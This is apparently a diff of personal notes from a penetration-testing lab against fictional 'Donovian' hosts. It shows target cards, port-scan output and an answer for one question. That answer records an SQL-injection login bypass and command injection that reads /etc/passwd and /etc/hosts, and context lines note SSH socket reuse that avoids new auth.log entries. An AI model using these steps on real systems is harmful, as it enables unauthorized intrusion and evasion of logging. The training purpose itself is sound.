@@ -477,6 +477,12 @@ Target Log: Shows one entry.
 Connect Slave: ssh -S /tmp/s root@target
 Target Log: tail /var/log/auth.log -> No new entry.
 Check Connections: ss -ntp on target shows only one established TCP connection despite multiple active shells.
+
+Pay Attention to these 4 directories
+/var/spool/cron/
+/var/spool/cron/crontabs/
+/etc/crontab
+/etc/cron.d/
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 Scheme of Maneuver:
 >Jump Box
@@ -894,6 +900,150 @@ Question 7:
 
 Question 8:
 	
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+Scheme of Maneuver:
+>Jump Box
+->T1: 192.168.28.100
+-->T3:x.x.x.9
+
+Target Section:
+
+T1
+Hostname: Donovian_Extranet
+IP: 192.168.28.100
+OS: CentOS
+Creds:Unknown
+Last Known SSH Port: 2222
+PSP: none
+Malware: none
+Action: Perform SSH masquerade and survey system. Identify redirection to the next target.
+
+T2
+Hostname: Donovian_Intranet
+IP: ???
+OS: ???
+Creds:Unknown
+Last Known SSH Port: ???
+PSP: none
+Malware: none
+Action: Perform SSH masquerade and survey system. Identify redirection to the next target.
+
+T3
+Hostname: unknown
+IP: x.x.x.9
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Gain access; survey host and map Donovian internal Cyberspace.
+
+80/tcp   open  http
+| http-enum: 
+|   /admin/: Possible admin folder
+|	/admin/admin.php: after login.php, admin page with check process box
+|	/admin/login.css
+|   /admin/login.php: Possible admin folder
+|_  /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+2222/tcp open  EtherNetIP-1
+
+
+Extranet
+
+Question 1:
+	url 127.0.0.1:62000/admin/login.php
+		user: 'OR 1='1
+		pass: 'OR 1='1
+	url changed to /admin/admin.php
+		check process text box
+		; whoami
+			www-data
+		;pwd
+			/var/www/html/admin
+		; ls -lisa /var/www/html/
+		; cat /etc/passwd | grep /bash
+			root:x:0:0:root:/root:/bin/bash
+			www-data:x:33:33:www-data:/var/www:/bin/bash
+			ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+			comrade:x:1001:1001::/home/comrade:/bin/bash
+		; cat /etc/hosts
+			127.0.0.1 localhost
+
+			# The following lines are desirable for IPv6 capable hosts
+			::1 ip6-localhost ip6-loopback
+			fe00::0 ip6-localnet
+			ff00::0 ip6-mcastprefix
+			ff02::1 ip6-allnodes
+			ff02::2 ip6-allrouters
+			ff02::3 ip6-allhosts
+			192.168.150.253 Donovian-Intranet
+
+Question 2:
+	
+
+Question 3:
+	
+
+Question 4:
+	
+
+Question 5:
+	
+
+Intranet
+
+Question 6:
+	
+
+Question 7:
+	
+
+Question 8:
+	
+
+Question 9:
+	
+
+Question 10:
+	
+
+Question 11:
+	
+
+Question 12:
+	
+
+Internal
+
+Question 13:
+	
+
+Question 14:
+	
+
+Question 15:
+	
+
+Question 16:
+	
+
+Quesiton 17:
+	
+
+Question 18:
+	
+
+Question 19:
+	
+
+
+
+
+
+
+
+
 
 
 
